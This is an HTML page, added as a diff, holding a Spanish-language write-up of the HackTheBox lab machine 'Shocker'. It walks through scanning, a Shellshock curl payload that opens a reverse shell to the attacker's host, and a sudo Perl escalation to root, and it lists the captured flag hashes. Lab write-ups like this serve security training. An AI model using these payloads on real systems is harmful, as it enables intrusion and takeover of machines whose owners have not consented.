@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Shocker | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-success fs-6">Easy</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">Shellshock</span>
+        <span class="badge bg-secondary">CGI</span>
+        <span class="badge bg-secondary">CVE-2014-6271</span>
+        <span class="badge bg-secondary">Sudo</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Shocker</h1>
+      <p class="text-secondary mb-3">Shellshock en script CGI permite RCE directo; escalada con sudo NOPASSWD sobre Perl.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">wfuzz</span>
+        <span class="badge bg-dark border border-secondary p-2">curl</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p80,2222 10.10.10.56 -Pn -n -oN targeted</code></pre>
+      </div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-globe"></i> Enumeracion - CGI-BIN</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wfuzz -c --hc 404 -t 100 -w /usr/share/dirb/wordlists/common.txt http://10.10.10.56/FUZZ
+# Encontramos cgi-bin/</code></pre>
+      </div><div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wfuzz -c --hc 404 -t 100 -w /usr/share/dirb/wordlists/common.txt -w extensions.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z</code></pre>
+      </div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> Explotacion - Shellshock</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/443 0&gt;&amp;1'" http://10.10.10.56/cgi-bin/user.sh
+sudo nc -lvp 443</code></pre>
+      </div><div class="code-block mb-3"><pre><code>cat /home/shelly/user.txt
+# 2ec24e11320026d1e70ff3e16695b233</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada - Sudo Perl</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>sudo -l
+# (root) NOPASSWD: /usr/bin/perl</code></pre>
+      </div><div class="code-block mb-3"><pre><code>sudo /usr/bin/perl -e 'exec "/bin/sh";'
+# whoami -> root
+cat /root/root.txt
+# 52c2715605d70c7619030560dc1ca467</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>Shellshock (CVE-2014-6271) en scripts CGI permite RCE sin autenticacion via header HTTP.</li>
+<li>Siempre fuzzear cgi-bin/ con extensiones sh, cgi, pl para encontrar scripts vulnerables.</li>
+<li>Perl con sudo NOPASSWD es una escalada trivial segun GTFOBins.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
